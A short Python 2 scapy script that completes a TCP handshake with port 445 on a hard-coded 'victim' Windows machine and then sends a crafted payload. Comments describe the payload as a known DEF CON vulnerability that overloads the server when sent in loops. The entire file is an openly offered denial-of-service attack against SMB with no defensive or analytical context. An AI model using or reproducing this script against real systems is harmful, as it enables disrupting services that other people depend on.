#!/usr/bin/env python
from scapy.all import * # import everything from scapy

conf.L3socket #raw packets to be used at layer 3
conf.L3socket=L3RawSocket # telling layer that we willbe using the Raw packets

i=IP() #p ip packet created 
i.dst="10.0.2.15"#vicitm IP tobe entered
t=TCP() #tcp layer over ip incase of udp it will be t=UDP()
t.dport=445 # destination port on the victim windows machine after enabling the port 445
r=sr1(i/t) # sending the the first tcp packet and receiving it in r
t.flags="A" # sending an ACK packet 
t.seq=r.ack # a large number of ther order 2^32 is required here to satisy the tcp hanshake so we use the ack from previous  instead of calculating.
t.ack=r.seq+1 # increasing the previous sequence and sendinf an ACK for the three way TCP handshake to complete.
req="\x00\x01\xff\xff" # known vulnerabilitiy for port exposed at defcon, if send in loops will overload the server.
p=send(i/t/req) #send the packet
print p.display()
 
